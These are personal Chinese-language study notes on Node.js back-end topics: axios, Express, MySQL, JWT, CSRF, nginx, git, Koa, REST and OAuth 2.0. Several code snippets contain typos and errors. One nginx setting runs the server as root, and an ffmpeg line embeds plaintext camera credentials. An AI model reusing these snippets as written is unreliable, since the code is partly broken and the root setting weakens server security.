#### 关于axios请求报错ECONNRESET

~~~css
econnreset
axios({})在请求中加上timeout的时间限制  延长>1000（默认值）
~~~

#### axios的封装

~~~js
const request=axios.create({
    baseURL:"",
    timeout:6000
})

//错误处理器
const errorHandler=(error)=>{
    if(error.response){
       /*
       {
    "data": "",
    "status": 405,
    "statusText": "Method Not Allowed",
    "headers": {
        "access-control-allow-credentials": "true",
        "access-control-allow-origin": "http://127.0.0.1:5500",
        "allow": "GET, HEAD, OPTIONS",
        "connection": "keep-alive",
        "content-length": "0",
        "date": "Wed, 06 Jan 2021 09:01:49 GMT",
        "vary": "Origin"
    },
    "config": {
        "url": "login",
        "method": "post",
        "headers": {
            "Accept": "application/json, text/plain, \*\/\*"
        },
        "transformRequest": [
            null
        ],
        "transformResponse": [
            null
        ],
        "timeout": 0,
        "xsrfCookieName": "XSRF-TOKEN",
        "xsrfHeaderName": "X-XSRF-TOKEN",
        "maxContentLength": -1,
        "maxBodyLength": -1
    },
    "request": {
        "custom": {
            "events": {},
            "requestHeaders": {},
            "responseHeaders": {},
            "method": "POST",
            "url": "login",
            "async": true,
            "options": {
                "url": "login",
                "type": "POST",
                "body": null
            },
            "timeout": 66,
            "xhr": {}
        },
        "readyState": 4,
        "responseURL": "http://127.0.0.1:5500/Node/express-01/login",
        "status": 405,
        "statusText": "Method Not Allowed",
        "responseType": "",
        "response": "",
        "responseText": "",
        "responseXML": null,
        "timeout": 0
    }
}*/
       const token=localStorage.getItem('token');
        if(error.response.status===403){
            //没有权限的信息提示
        }
        if(error.response.status===401 && !data.isLogin){
            //token 认证失败的新提示
            if(token){
                //提出登录
            }
        }
    }
    return Promise.reject(error)
}

//拦截器的配置
request.interceptors.request.use(config=>{
    const token=localStorage.getItem('token')
    if(token){
        config.headers['Access-Token']=token;
    }
    return config
},errorHandler)//一般请求错误的 http的错误提示有 4开头 401:超时 404:not found 没有找到接口
request.interceptors.response.use(config=>{
    reutrn config.data;
},errorHandler) //响应的错误处理有：5开头： 500：系统错误，502:系统重启

export default request;
~~~



### express中 重新定义html静态文件的文件夹名称

~~~css
app.set('views',path.join(__dirname,'src'))//views 是默认值 后面是修改值
~~~

### 数据库

#### mysql

##### 创建数据库的操作

~~~css
1.create database python3(这是数据库创建的名称，自己定义) charset=utf8;
2.show databases;列出所有的database
3.select database(); 当前的数据库名
4.use python3(数据库名)； 切换数据库
5.drop python3; 删除数据库
~~~

##### 数据库中表的操作

~~~css
1.create table students(
	id int not null auto_increment primary key,
	name varchar(18) not null,
	gender bit default 0
);
2.alter table students add|drop|change （字段的类型和约束）；
	alter table students add isDel bit default 0;
3.drop table students(表名);删除表名
4.desc students; 查看表结构
5.rename table xxx(旧表名) to xxx(新表名)
~~~

##### 数据库中表的数据操作

~~~css
1.select * from xxx（表名）;
~~~

~~~css
2.insert into xxx values();
全列插入：insert into 表名 values(...)
缺省插入：insert into 表名(列1,...) values(值1,...)
同时插入多条数据：insert into 表名 values(...),(...)...;
或insert into 表名(列1,...) values(值1,...),(值1,...)...;
~~~

~~~css
3.update
update xxx(表名) set 列1=值1,... where 条件
~~~

~~~css
4.delete
delete from 表名 where 条件 //物理删除
update xxx set isDel=1 where...;
~~~

##### mysql中的子查询

~~~css
**子查询中，程序先运行嵌套在最内层的语句，再运行外层的语句**

子查询一共有三种方法
1.where 中的子查询
	select goods_id,goods_name,goods_price from goods where goods_id=(select max(goods_id) from goods)
where 列=（内层sql）则内存sql返回的必须是单行单列 单个值
where 列 in (内层sql) 则内层sql返回的必须是单列，但是可以是多行

2.from 型子查询
***查询结果在结构上可以当成表看，即可以再次查询
~~~

##### mysql中的sql防止注入

~~~css
针对前端传输过来的数据 提取是使用 mysql.escape(username) mysql.escape(password)
~~~





### 原生模块

~~~css
cookie的注意事项：
	1.httpOnly 定义在cookie中时 是在浏览器端脚本代码无法修改cookie值			（document.cookie='...'），但是在Application 存储的cookie值还是可以手动修改的
	2.在解析cookie值的时候是没有获取到 path 和 expires 的值的，只是获取到了k=v 类型的值	
~~~

~~~css
session值的注意事项
全局变量：SESSION_SET={}
SESSION_SET['由cookie处得到的服务器返回的唯一值id']=req.session={}
两者指向的是同一个对象
~~~



### Express 

#### https和http协议的使用

~~~css
express=require('express')
app=express()
http=require('http').createServer(app)
//https需要openssl生成ssl证书
fs=require('fs')
let credential={}
credential.key=fs.readFileSync('private.pem')
credential.cert=fs.readFileSync('file.crt')
https=require('https').createServer(credential,app)

//生成RSA密钥=》使用密钥生成自签名证书crt=》使用密钥生成csr签名请求=》请求签发证书进行签发，生成 x509证书(csr=>crt)
~~~

+ openssl证书的生成的方法

  ~~~css
  //生成私钥key文件
  1.openssl genrsa 1024 private.pem
  //通过私钥生成CSR证书签名
  2.openssl req -new -key private.pem -out csr.pem
  //通过私钥文件和csr证书签名生成证书文件
  3.openssl x509 -req -days 365 -in csr.pem -signkey private.pem -out file.crt
  
  private.pem 私钥
  csr.pem		证书签名
  file.crt	证书文件
  ~~~


#### express 设置返回的状态值的方法

~~~css
res.status(204)
~~~

#### express中动态路由的设置方法

~~~css
1.app.get('/user/:aid',(req,res)=>{}) 获取动态路由的参数方法为 req.params 返回的结果为：{aid:'你在路由user/后面中输入的字符串'}
2.app.get('/user/*.png',(req,res)=>{}) 这也是一种动态的路由方式 获取它的参数的方法为 req.params 
返回的结果为 {'0':'你在/user/后面输入的所有字符'} 如{'0':'1234'} {'0','324asdfa'} 都行
req.params[0] 即可获取到值
~~~

#### cookie 的过期时间是世界时间

~~~css 
expires=date.toUTCString()

在原生模块中设置 cookie的方式 为
res.setHeader('Set-Cookie','key=value; key=value; path=/; expires=')
注意的是：path expires 有默认值

~~~

#### csrf

~~~css
使用的库: csurf({cookie:false/true})
cookie
确定用户的令牌秘密是否存在cookie或 req.session 中.
cookie默认值为false
当cookie设置成 true , 然后模块会改变行为并不在使用 req.session。意味着不需要使用session中间件。相反，在此组件之前，只需使用 cookie-parser 中间件
{cookie:{key:'_csrf',path:'/'}}
key - 用于存储令牌的cookie名称（默认：_csrf）

path - cookie的路径（默认：/）

其他选项参考 res.cookie
在路由或控制器中获取token的方法为：req.crsfToken()

不需要验证csrf的路由放在 app.use(csrf({cookie:true}))之前


如果csurf()为空的时候，就需要express-session的中间件配合了
获取token的方法为 req.session.csrfSecret属性

crsf的错误捕获 err.code==='EBADCSRFTOKEN'
~~~



#### 短信验证码

~~~css
leanCloud 
npm install -S leanClound-storage 
let sms=requrie('leanClound-storage');
sms.init({
    appId:'',
    appKey:'',
    serverURL:''
})
//向第三方请求验证码
sms.Cloud.requestSmsCode({
    mobilePhoneNumber: '17511694655', // 目标手机号
    name: 'test',      // 控制台预设的模板名称
    code:'验证码',                  // 控制台预设的短信签名
    ttl:1,
    op:'nothing seek,nothing find'
}).then(ret=>{
    //成功
}).catch(err=>{
    //失败
})
//向第三方发送验证验证码
sms.Cloud.verifySmsCode([前端发来的参数]).then().catch()
~~~

#### 邮箱验证码

~~~css
const nodemailer = require("nodemailer");

//发送方的邮箱host查找：node_modules=>nodemailer=>lib=>well-known=>services.json

//创建邮件的发送对象
let transporter = nodemailer.createTransport({
    host: "smtp.qq.com",//发送方的邮箱类型 qq等
    port: 465,
    secure: true, // true for 465, false for other ports
    auth: {
        user: '1084266319@qq.com', // 发送方的邮箱地址
        pass: '**********', // smtp的验证码 【用手机号码发送验证码后动态获取的】各人不同
    },
});

//邮件信息
let mailobj = {
    from: '"Fred Foo 👻" <1084266319@qq.com>', // sender address
    to: "1084266319@qq.com", // list of receivers
    subject: "Hello ✔", // Subject line
    text: "Hello world?", // plain text body
    html: "<b>您的验证码是1234567</b>", // html body
};

//发送邮件
transporter.sendMail(mailobj)// 异步的函数
异步的函数 会有回调函数
transporter.sendMain(mailobj,(err,data)=>{
    if(err){console.log(err);return }
    console.log('success:',data)
})

~~~

#### jsonwebtoken的验证方式

~~~css
RFC 7519开放标准
定义了一种紧凑且独立的方式，可以将各方的信息作为json对象进行安全传输
改信息可以验证和信任，因为是经过数字签名的
~~~



~~~css
const jwt=require('jsonwebtoken')

module.exports={
    encrypt(data,time){
        //data 对象 中一定要有当前用户的id字段，这个verify时 然后到数据库中查找对应的user有用
        //secret string 本次的混合加密的字符串，默认的加密算法为SHA-256 HS256
        return jwt.sign(data,secret,{expiresIn:time})
    }
    decrypt(token){
        try{
            let data=jwt.verify(token,secret)
            return {
                msg:true,
                id:data.id
            }
        }catch(err){
            return {
                msg:false,
                error:err
            }
        }
    }
}
~~~

#### postman中自动设置token的全局脚本

~~~css
选择Tests的标签页
var jsonData=pm.response.json();
pm.globals.set('token',jsonData.token)

后面就可以在 鉴权 Authorization标签页中
选择Type:Bear Token选项 在后端获取token验证的时候是需要去掉 “Bear ”的字符串
Token中填入 {{token}}
~~~



#### session 和jwt的比较 ：认证和授权方式

~~~css
session相比于JWT,最大的优势在于服务器可以主动清除session
session保存在服务器端，相对安全
session结合cookie使用,较为灵活，兼容性好

劣势：
cookie+session 在跨域场景下表现不好
分布式的部署，需要做多机共享session
基于cookie的机制很容易被CSRF
查询session信息可能会有数据库的查询操作

比较：
可拓展性：jwt
安全性：都会遇到攻击
	csrf 
	xss
	中间人攻击 https预防
session 不符合 restful api的架构限制
性能：各有利弊
时效性：jwt只有在过期后自动销毁
		session 可以被删除


~~~



### cheerio 只能是对标签使用jquery的dom操作

~~~css
$=cheerio.load(url)
//出现乱码的问题
$=cheerio.load(url,{decodeEntities:false})

~~~

### nodejs 的优缺点

~~~css
优点：
1、高并发
2.异步
3.事件驱动
4.单线程
缺点：
1.大量的匿名函数，使得异常错误的解读困难
2.try/catch只能捕获同步代码的异常，nodejs对异步代码的异常捕获较为困难
~~~

### 开发server端和前端的区别

~~~css
server服务端需要考虑的有：
1.服务的稳定性
	server端可能会遭受各种恶意攻击和误操作
	单个客户端可以意外挂掉，但是服务端不能
	node中用pm2做进程守候，一旦挂掉，自己会重启
2.安全
	server端要随时准备接收各种恶意攻击，前端则少很多
	如越权操作，数据库攻击等
	nodejs会登陆验证，防止越权操作。预防xss攻击和sql注入
3.cpu和内存(优化和扩展)
	客户端独占一个浏览器，内存和cpu都不是问题
	server端要承载很多请求，cpu和内存都是稀缺资源
	node用stream写日志，使用redis存session
4.日志的管理=> 日志的写入、日志的分析、日志的管理
    前端也会参与写日志，但只是日志的发起方，不关心后续
    server端要记录日志，存储日志，分析日志，前端不关心
    nodejs会有多种日志记录方式，以及如何分析日志
5.集群和服务拆分
	产品发展速度快，流量可能会迅速增加
	如何通过扩展机器和服务拆分来承载大流量？
	nodejs是单机器开发，但是从设计上支持服务拆分
~~~

### path内置模块

~~~css 
path.join(__dirname,'') //前面的__dirname和后面的路径进行拼接  当前文件的根路径和后面的输入路径拼接
path.resolve(__dirname,'') //不管后面的路径是哪个，返回的都是 绝对路径

//将路径或路径片段的序列解析为绝对路径
//给定的路径会从右到左进行处理，后面的每个path会追加到前面，直到构造出绝对路径
在解析中，重右向左，当遇到'/'开头的字符是，立即停止解析，直接返回解析号的路径
console.log(path.resolve('a','b'))未解析到 / 所以使用到当前工作目录 即返回的

let ret=path.resolve(__dirname,'E:\\download\\file\\01Nodejs+MongoDb')
console.log(ret)//返回 E:\download\file\01Nodejs+MongoDb

let ret2=path.join(__dirname,'E:\\download\\file\\01Nodejs+MongoDb')
console.log(ret2)//G:\study\html5W2\d9\E:\download\file\01Nodejs+MongoDb

path.normalize(pathname[string])//对应不同系统下规范路径

path.sep//平台提供的特定的路径片段分隔符 
	windows：\
	posix:/
~~~

### 网络通信

+ 网络分层

  ~~~css
  OSI七成模型
  	(数据链路层、物理层)、网络层、传输层、（应用、会话、表示层）
  TCP/IP四层模型
  	链路层、网络层、传输层、应用层
  ~~~

+ 端口数量

  ~~~css
  linux系统中的端口数量为 2**16 =65536 0~65535
  
  知名端口：0~1023
  80给http
  21给ftp
  443给https
  
  端口的作用：就是通过IP+端口号区别不同的服务
  
  ~~~

+ IP

  ~~~css
  IP就是在网络中标记一台电脑的一串数字
  在网络中标记一台电脑的数字 在本地局域网中是唯一的
  
  子网掩码：确定IP的网络号和主机号，他不能单独存在，必须和IP地址一起使用
  
  子网掩码：也是32位
  左边网络号 ，用二级制1表示
  右边主机号：用二进制0表示
  255.255.255.0 
  255.255.255 代表的是网络号
  0		代表的是主机号 
  主机号尾端不为 0 和  1
  
  ~~~

#### 网络的连接方式

~~~css
网线、 无线、 蓝牙、光、 。。。
无论哪种方式，都需要在电脑中有对应的硬件设备来处理这些需要 共享 传输 的数据

网线/无线=》网卡(无线网卡)
蓝牙=>蓝牙模块(硬件)
这些硬件的作用就是 用来连接和转发数据的

~~~



### nginx 部署问题

#### nginx 转发websocket报400错误

~~~css
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection "upgrade";

第一行告诉nginx使用http/1.1协议，这是websocket必须要使用的协议
第二和第三行告诉nginx，当它要使用websocket时，响应http升级请求
~~~



#### ubuntu安装nginx

~~~css
apt-get install build-essential
apt-get install libtool
apt-get install libpcre3 libpcre3-dev
apt-get install zlib1g-dev
apt-get install openssl
apt-get install libssl-dev 
~~~

#### nginx.conf配置

~~~css
user root;(由nobody修改而成)//这样可以使用用户自己定义的路径文件路径
~~~



#### 使用apt install nginx

~~~css
nginx文件安装完成之后的文件位置：

/usr/sbin/nginx：主程序
/etc/nginx：存放配置文件
/usr/share/nginx：存放静态文件
/var/log/nginx：存放日志
/usr/local
~~~

#### 使用文件压缩包的方式

~~~css
nginx的目录

启动 注意是以root权限操作
/usr/local/nginx/sbin   ./nginx 
停止
/usr/local/nginx/sbin   ./nginx -s stop
重启
/usr/local/nginx/sbin   ./nginx -s reload
配置 
/usr/local/nginx/conf    打开配置文件 nginx.conf 

配置方法 
1.反向代理 **反向代理时 proxy_pass 后面的路由路径需要 加上 http:协议**
	输入 www.123.com 打开百度
	a.先修改 本地 hosts 文件 添加 虚拟机IP地址（nginx所在的机器） 和www.123.com 绑定
	b.nginx中 server块中 
		｛
			listen 80;
			server_name 192.168.1.115;
            location / {
				proxy_pass http://www.baidu.com
            }
		｝
** 如果配置报了 404的错误时 是因为 路径配置有错误
 默认会将location后带的URL添加到路径的最末尾
    如：location ~ /edu/ {
        root /html/;
        index index.html;
    }
    web中真实匹配的路径为：url/html/edu/index.html
        不是我以为的 url/edu/index.html
~~~

~~~css
***相当重要的部分
location [=|~|^~|~*] uri{}
=:的意思是 uri中没有正则匹配
~：uri中有正则匹配的规则,而且区分大小写
^~:很少用暂不用理解
~*：uri中有正则匹配的规则，而且不区分大小写
~~~

#### 负载均衡

~~~css
在server块的前面（不在server{}内,在http{}内）
upstream [本次负载均衡服务的名称]{
    **使用哪种方式 实现**;
    server ip地址； 不加 http 
    server ip地址；
}
location / {
    proxy_pass http://my_servers;  *********重要的事件说三遍 加上http:// http:// http://
    index index.html;
}
1.轮询
每个请求按时间顺序逐一分配到不同的后端服务器，服务器挂掉一个，自动剔除；
2.权重
weight代表权重 默认为1；数值越大分配到的客户端越多
3.ip_hash
每个请求按访问IP的hash结果分配，这样每个访客固定访问一个服务器
4.fair
按照服务器的响应时间来分配请求，响应时间短的优先分配

~~~

####  invalid URL prefix

~~~css
这种错误多是 没有添加 http://协议
~~~

#### 动静分离

~~~css
设置两个location 
一个配置 动态文件
一个配置 静态资源文件

静态资源的location /static/ {
    root /html/;
    autoindex on;*****重要的事情说三遍 audoindex on audoindex on autoindex on autoindex autoindex autoindex autoindex autoindex autoindex autoindex autoindex on 
}
~~~

### node-rtmp-module 

#### rtsp推送方式

~~~css
ffmpeg -rtsp_transport tcp -i 'rtsp://admin:admin1234@192.168.112.252:554/cam/realmonitor?channel=1&subtype=0' -stimeout '3000000' -vcodec copy -acodec copy -f flv -y 'rtmp://localhost:1935/hls/test'

~~~

#### nginx.conf配置说明

##### rtmp配置

~~~css
rtmp{
    listen 1935;
    chunk_size 4000;
    application play{
        play /home/study/Desktop/html/play;
    }
    application hls{
        live on;
        hls on;
        hls_path /home/study/Desktop/html/hls;
        hls_fragment 1s;
        hls_playlist_length 4s;
    }
    application live{
        live on;
    }
}

play位视频播放配置，静态文件播放
hls为通过推送的方式，保存视频片段ts文件，通过m3u8来播发。
live就是单纯的视频流推送

hls_fragment 1s;
hls_playlist_lenth 4s;
主要涉及延时优化的功能
~~~

##### html的配置

~~~css
http{
    include mime.types;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65
    server{
        listen 8000;
        location /stat{
            rtmp_stat all;
            rtmp_stat_stylesheet stat.xsl;
        }
        location /stat.xsl{
            root /usr/local/nginx-rtmp-module
        }
        location /hls{
            types{
                application/vnd.apple.mpegurl m3u8;
                video/mp2t ts;
            }
            root /home/study/Desktop/html;
            add_header Cache-Control no-cache;
        }
    }
}
stat和stat.xsl主要访问视频推送概况，注意目录指向
hls主要是配置视频流的访问
~~~



### git 

#### git 进入到命令行的模式后

~~~
1.保存并退出：

（1）按 Esc 键退出编辑模式，英文模式下输入 :wq ，然后回车(write and quit)。
（2）按 Esc 键退出编辑模式，大写英文模式下输入 ZZ ，然后回车。

2.不保存退出：
　　按 Esc 键退出编辑模式，英文模式下输入 :q! ，然后回车。
　　按 Esc 键退出编辑模式，英文模式下输入 :qa! ，然后回车。
~~~



#### git config查询和用户信息设置

~~~css
git config --list 所有的配置列表
git config --global --list 用户配置信息列表
git config user.name 
git config user.email 
git config --global user.name ...
git config --global user.email ...
git config --global --unset user.name

控制面板/用户账户/管理您的凭据 凭据管理

~~~

#### .gitignore文件添加的文件名或者类型没有起到忽略效果的原因

~~~css
原因：新建的文件在git中会有缓存，如果某些文件已经被纳入了版本管理中，就算是在.gitignore中已经声明了忽略路径也是不起作用的，这时候我们就应该先把本地缓存删除，然后再进行git的push，这样就不会出现忽略的文件了。

git rm -r --cached .

//然后重新的add commit 操作
~~~



#### 修改和提交

~~~css
丢弃工作区的修改
git checkout -- [file] 放弃工作区的修改内容，返回最近的一次commit
添加到暂存区
git add .
暂存区到本地的版本库（贮存区）
git commit -m ""
重暂存区撤销到工作区
git reset HEAD ..

~~~

#### 分支操作

~~~css
git branch  列出当前的所有分支
git checkout -b [name] 创建一个新的分支,并且切换到新分支
git checkout [name] 切换分支
git merge [from name] 将name分支和当前所在的分支合并
git branch -d [name] 删除name分支

切换分支这个动作，用switch更科学。因此，最新版本的Git提供了新的git switch命令来切换分支：
git switch -c [name] 创建新的分支
git switch [name] 切换分支    
~~~

#### 本地操作

~~~css
git add [name] 文件保存到暂存区
git add . 所有文件保存到暂存区
git commit -m "" 暂存区的文件保存到版本区
git status 查看当前的状态
git log 显示的是最近n次commit记录
git reset --hard [commit_id] 版本回退、回滚

查看 工作区和暂存区的区别
git diff 
查看 当前的版本库和工作区的区别
git diff HEAD
查看 当前版本库和暂存区的区别
git diff --cached
查看 当前版本库的不同版本的区别
git diff [提交的id版本号] [提交的ID版本号2]

删除工作区和暂存区的文件
git rm [file]
git checkout [file] 撤销掉所有的工作区修改
git reset HEAD [file] 暂存区撤销掉
git reflog 记录你所有的操作

git remote 查看远程仓库
git reset --hard HEAD^ 版本回退
**HEAD^ 上一个版本
HEAD^^  上上个版本
HEAD~n  到上n的版本

或者
git reset --hard [1094a] //reflog记录的ID

打包 tag 一定要先将本地的代码提交到远程仓库先
Git tag 查看当前的标签号 
git tag <版本号> -m "本次tag的说明"
	git tag v1.0.0 -m "first tag"
提交打标签 到远程仓库
git push origin v1.0.0
将本地的所有tag都提交到远程仓库
git push origin --tag 

本地的标签tag删除
git tag -d <版本号>
远程仓库端删除
git push origin :refs/tags/<版本号>

退出命令行的编辑模式的方法：window环境 ZZ(大写)
~~~

#### 初始化本地已有的项目

~~~css
本地操作
1.初始化本地仓库
	git init 
2.remote 
	git remote add origin 仓库地址（需要远程仓库已经创建好的地址）
3.从远程分支拉取master分支并与本地的master分支合并
	git pull origin master:master
4.提交本地分支到远程分支
	git push -u origin master 
5.将现有项目添加并提交上传
	git add .
	git commit -m ""
	git push origin master
~~~



### child_process子进程模块

~~~css
spawn('cmd命令',[参数或者需要执行文件的路径]) 返回一个childProcess对象，所以可以获取stdin,stdout,stderr
exec('直接写cmd命令+参数或者需要执行文件的路径') 和spawn 主要区别是有大小限制
execFile('cmd命令',[参数或者需要执行文件的路径])
fork('./test.js') 参数为文件名，意味使用 fork 方法创建了一个子进程实例 ，并且指定了子进程的的运行目录为 child.js
是 spawn 方法的变形的一种形式，也是用来创建进程。二者最大的不同之处在于：fork 方法会创建一个内置的通信信道，允许消息在父进程和子进程之间来回传递

process.exit()//直接结束当前进程
结束子进程的方法为 subchild.kill(process.pid,'终止的信号') signal：具体查看 process的信号事件
process.kill(process.pid,siganl)
~~~

#### parent.js

~~~css
const {fork}=require('child_process')

let sp=fork('./test3.js')
sp.send('hello')

process.on('message',msg=>{
    console.log('接收到了子进程的结果',msg)
})

setTimeout(()=>{
    sp.send('close')
},4000)

sp.on('close',(code,signal)=>{
    console.log(code)
    console.log('singal',signal)
})

~~~

#### test3.js

~~~css
process.on('message',msg=>{
    if(msg==='close'){
        process.exit()
    }else{
        console.log('接收到的消息为:',msg)
    }
})

count=0;
setInterval(()=>{
    count+=1;
    process.send(count)
    console.log(count)
},1000)
~~~

### Koa

~~~css
cxt 上下文环境
next是异步函数 返回的是promise类型
await next() 才能执行下一步
cxt.state 用户数据存储空间
~~~

#### koa使用到的中间件

~~~css
koa-router
koa-bodyparser
koa-json-error  处理错误中间件
error=require("koa-json-eror") //检验 404，500，412等系统错误
app.use(error({
    postFormat:(e,{stack,...rest})=>{
        process.env.NODE_ENV==='production'?rest:{stack,...rest}
    }
})) 

koa-parameter 校验参数
app.use(parameter(app))
ctx.verifyParams({//不符合会返回422错误代码
    name:{type:'string',required:true}
})

koa-jwt 
koa-body 替换 koa-bodyparser
koa-bodyparser只支持body\form不支持文件
app.use(koaBody({
    multipart:true,
        formidable:{
            uploadDir:'上传的路径',
            keepExtentsions:true,//保留拓展名.jpg,.png...
    }
}))
//获取文件
ctx.request.files.file

koa-static 生成静态服务
	//访问的路径中没有 public
	app.use(koaStatic(path.join(__dirname,'public')))
	//访问的路径中带有 public
	app.use(KoaStatic(__dirname,'public'))

path.basename('文件的绝对路径')//这就得到了
ctx.origin 得到当前的host name 

<input accept="image/png,image/jpg,image/jpeg">


    ctx.state 约定俗成的：放置一些用户信息
    ctx.state.user=user

cxt.query  =>得到{ name: 'han', password: '1234' }
cxt.querystring => 得到 name=han&password=1234
cxt.params =>动态路由
cxt.request.body=>
	application/x-www-form-urlencoded 数据格式为：name= 'han'&password='1234' 的键值对形式
	application/json   数据格式为：{ name: 'John', password: '1234' }

koa-acl rbac
~~~

#### koa-onerror

~~~css
const onerror=require('koa-onerror')
onerror(app)
这里的会有详细的错误信息
~~~

#### koa-body

~~~js
const koaBody=require('koa-body')
app.use(koaBody({
    multipart:true,
   	formiddable:{
        uploadDir:path.join(__dirname,'public/upload'),
        keepExtensions:true,
        onFileBegin:(name,age)=>{
            console.log(name)
            console.log(age)
        }，
        onError:(err){
   			console.error('error',err)
		}
    } 
}))

需要注意的是，如果是获取上传后文件的信息，则需要在 ctx.request.files 中获取。
其他信息在 ctx.request.body中获取

没有formidable:配置项时，文件的上传路径为
'C:\\Users\\han\\AppData\\Local\\Temp
~~~

##### koa-body中的参数--基本参数

| 参数名     | 描述                                               | 类型             | 默认值         |
| :--------- | :------------------------------------------------- | :--------------- | :------------- |
| patchNode  | 将请求体打到原生 node.js 的`ctx.req`中             | Boolean          | `false`        |
| patchKoa   | 将请求体打到 koa 的 `ctx.request` 中               | Boolean          | `true`         |
| jsonLimit  | JSON 数据体的大小限制                              | String / Integer | `1mb`          |
| formLimit  | 限制表单请求体的大小                               | String / Integer | `56kb`         |
| textLimit  | 限制 text body 的大小                              | String / Integer | `56kb`         |
| encoding   | 表单的默认编码                                     | String           | `utf-8`        |
| multipart  | 是否支持 `multipart-formdate` 的表单               | Boolean          | `false`        |
| urlencoded | 是否支持 `urlencoded` 的表单                       | Boolean          | `true`         |
| text       | 是否解析 `text/plain` 的表单                       | Boolean          | `true`         |
| json       | 是否解析 `json` 请求体                             | Boolean          | `true`         |
| jsonStrict | 是否使用 json 严格模式，`true`会只处理数组和对象   | Boolean          | `true`         |
| formidable | 配置更多的关于 `multipart` 的选项                  | Object           | `{}`           |
| onError    | 错误处理                                           | Function         | `function(){}` |
| stict      | 严格模式,启用后不会解析 ` GET, HEAD, DELETE ` 请求 | Boolean          | `true`         |

##### formidable相关参数配置

| 参数名         | 描述                                         | 类型     | 默认值                  |
| :------------- | :------------------------------------------- | :------- | :---------------------- |
| maxFields      | 限制字段的数量                               | Integer  | `1000`                  |
| maxFieldsSize  | 限制字段的最大大小                           | Integer  | `2 * 1024 * 1024`       |
| uploadDir      | 文件上传的文件夹                             | String   | `os.tmpDir()`           |
| keepExtensions | 保留原来的文件后缀                           | Boolean  | `false`                 |
| hash           | 如果要计算文件的 hash，则可以选择 `md5/sha1` | String   | `false`                 |
| multipart      | 是否支持多文件上传                           | Boolean  | `true`                  |
| onFileBegin    | 文件上传前的一些设置操作                     | Function | `function(name,file){}` |

### REST ful API

~~~css
http的options的方法作用：
	检测服务器所支持的请求方法
	cors中的预检请求

router.allowedMethod()的作用：
	1.在 allow 的字段中会显示 当前URI支持的请求方式 如HEAD GET POST DELETE
	2.返回405（没有实现的方法）或者501(不允许，当前框架没有或不认识这种请求方法)

不同请求方法返回的数据信息和格式  （在成功的情况下）
	GET：返回相应的请求数据信息 
	POST:返回当前提交的数据信息
	PUT/PATCH:patch是部分编辑修改 返回的数据是当前编辑和修改的数据
	DELETE:返回的是 status=204 表示本次操作成功


常见的异常状况
	运行时错误（500服务器本身）
	逻辑错，找不到(404) 先决条件失败（412）
~~~

#### 软件架构的风格

~~~css
representational state 			transfer
表述/表达			当前状态或数据   数据传输

~~~

#### 六个限制

##### 1.cs架构

~~~css
关注点分离
服务端：专注数据存储
客户端：用户界面、可移植性
~~~

##### 2.无状态

~~~css
所有用户会话信息都保存在客户端
每次请求必须包含所有信息，不能依赖上下文信息
服务端不用保存会话信息，提升了简单性、可靠性、可见性
~~~

##### 3.缓存cache:减少前后端交互提高交互性能

~~~css
所有服务端响应都要被标为可缓存或不可缓存
减少前后端交互，提升性能
~~~

##### 4.统一接口==>最重要的限制

~~~css
接口设计尽可能统一通用，提升简单性、可靠性、可见性
接口实现解耦，使前后端可以独立开发迭代

a.资源标识：
	可以命名的事物叫资源
	每个资源可以通过URI被唯一标识
b.通过表述来操作资源
c.自描述信息
	请求和响应必须提供足够的信息让接受者理解
	媒体类型（application/json|application/xml）
	HTTP方法（get/post/patch/put/delete）
	是否缓存 cache-control
d.超媒体作为应用状态引擎
	超媒体：带文字的连接
	应用状态：一个网页
	引擎：驱动、跳转
	加起来的理解为：点击连接跳转到另一个页面
~~~

##### 5.分层系统

~~~css
每层只知道相邻的一层，后面影藏的就不知道了
客户端不知道是和代理还是真实服务器通信
其他分层：安全层、负载均衡、缓存层
~~~

##### 6.按需代码

~~~css
客户端可以下载运行服务端传来的代码
通过减少一些功能，简化客户端
~~~

#### 请求的设计规范

~~~css
尽量使用名词
使用嵌套表示关联关系 如：/users/:id/repos  用户为ID下的仓库
使用正确的http方法
不符合CRUD的情况 使用post/action[动词]/子资源
~~~

#### 安全

~~~css
https
鉴权
限流 
	在请求头中加入 X-RateLimit-limit:60		每小时允许的最大请求数
				X-RateLimit-remaining:56	当前速率限制窗口中剩余的请求数
				X-RateLimit-Reset:			当前速率限制窗口重置时间，以UTC秒为单位
~~~



### OAuth 2.0是目前最流行的授权机制，用来授权第三方应用，获取用户数据

~~~css
数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌，用来替代密码，供第三方应用使用

1.令牌是短期的，到期后自动失效，用户自己无法修改
2.令牌可以被数据所有者撤销，会立即失效
3.令牌有权限范围

令牌的发布方式：四种，适用不同的互联网场景

~~~

#### 四种授权方式

~~~css
01授权码
最流行，安全性最高的，适用于有后端的web应用
第一步：A 请求B
https://b.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=CALLBACK_URL&scope=read

response_type 返回授权码code 
client_id 让B网站知道是谁在请求
redirect_uri B网站接受或拒绝后跳转的网址
socpe表示要求的授权范围

第二步
https://a.com/callback?code=AUTHORIZATION_CODE
	返回的就是code授权码
第三步
A网站拿到授权码后，向B网站请求 令牌
https://b.com/oauth/token?client_id=CLIENT_ID&client_secret=CLIENT_SECRET&grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=CALLBACK_URL
第四步
B网站收到请求后，就会颁发令牌，向redirect_uri指定的网址，发送一段json数据
{
    "access_token":"ACCSSS_TOKEN",
    "token_type":"bearer",
    "expires_in":2592000,
    "refresh_token":"REFRESH_TOKEN",//refresh_token,
    "socpe":"read",
    "uid":10001,
    "info":{
        ....
    }
}

02隐藏式
纯前端的应用，没有后端。这就需要隐藏式， 直接向前端发令牌。没有授权的中间步骤

1第一步
A提供链接到B网站，B网站授权用户数据给A网站使用
https://b.com/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=CALLBACK_URL&scope=read

response_type要求直接返回toke令牌

2.第二步
用户跳转到B网站，登录后同意给予A网站授权
http://a.com/callback#token=ACCESS_TOKEN

03密码式
高度信任某个应用，直接把B网站的密码和用户名在A网站输入,A网站拿到密码和用户名直接请求B网站的令牌
1.第一步：
https://oauth.b.com/token?grant_type=password&username=USERNAME&password=PASSWORD&client_id=CLIENT_ID
2.第二步
A网站拿到JSON数据

04客户端凭证
第一步
https://oauth.b.com/token?
  grant_type=client_credentials&
  client_id=CLIENT_ID&
  client_secret=CLIENT_SECRET

